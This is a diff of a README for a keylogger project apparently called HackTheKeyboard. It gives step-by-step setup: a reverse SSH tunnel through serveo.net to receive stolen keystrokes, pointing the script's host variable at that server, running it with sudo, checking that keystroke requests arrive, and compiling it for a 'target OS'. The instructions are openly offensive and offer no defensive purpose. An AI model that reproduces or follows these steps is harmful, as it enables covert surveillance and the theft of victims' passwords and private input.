@@ -26,18 +26,27 @@ Here is an example of setting up an environment using Android Termux
 
 3) Install Open SSH -> `pkg install openssh` or `apt-get install openssh`
     
-4) Open Reverse HTTP Tunnel to Serveo.net -> `ssh -R 80:localhost:8080 serveo.net`<br>
-   Note: 8080 is the deafault local port of apache, and port 80 will be the incomming port
+4) Open Reverse HTTP Tunnel to Serveo.net and wait -> `ssh -R 80:localhost:8080 serveo.net`<br>
+   Note: 8080 is the deafault local port of apache, and port 80 will be the incomming port from Internet
 
 <br>
-<b> Editing and Compiling the Keylogger Python file</b>
+<b> Editing and running the Keylogger</b>
 Editing and compiling requires python interpreter to be installed and a suitable IDE such as PyCharm.<br>
 (Rookies can just Google it online on "how to install python along with an IDE")
 
-1) Download the Zip package of this repo and extract in your drive.
-2) Install dependencies -> `pip install -r requirements.txt`
-2) Open your IDE and import the python script, modify the variable named "host=" with the hostname displayed after 4th point
-3) 
+1) Download the Zip package of this repo and extract in your drive or run `git clone https://github.com/Sumeet-R/HackTheKeyboard` in Linux.
+2) Install dependencies -> `pip3 install -r requirements.txt` or manually install the mentioned packages in requirements.txt from IDE
+3) Open your IDE and import the python script, modify the variable named "host=" with the hostname displayed at 4th step of server setup.
+4) Run the python code using `sudo python3 htk.py'
+5) Test by typing upto 20 characters. If requests with keystrokes appears in your serveo terminal, it would mean that you have sucessfully setup the keylog server and Keylogger.
+
+<br>
+<b> Compiling the Keylogger</b>
+You can search online how to compile a keylogger based on target OS environment.
+
+<br>
+<b> Want a Video demonstration? Have a quick look on below </b>
+
 
 
  
